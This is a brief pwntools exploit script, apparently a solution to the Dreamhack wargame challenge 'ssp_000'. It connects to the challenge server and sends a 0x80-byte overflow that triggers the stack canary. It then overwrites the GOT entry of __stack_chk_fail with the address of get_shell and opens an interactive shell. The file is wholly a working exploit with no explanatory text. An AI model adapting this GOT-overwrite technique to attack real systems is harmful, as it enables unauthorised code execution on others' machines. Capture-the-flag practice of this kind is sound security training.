from pwn import *

r=remote("host1.dreamhack.games",8263)
#r=remote("./ssp_000")

b=ELF("./ssp_000")

shell=b.symbols['get_shell']

pay=""
pay+='x'*0x80

r.sendline(pay)
r.sendline(str(b.got['__stack_chk_fail']))
r.sendline(str(shell))

r.interactive()

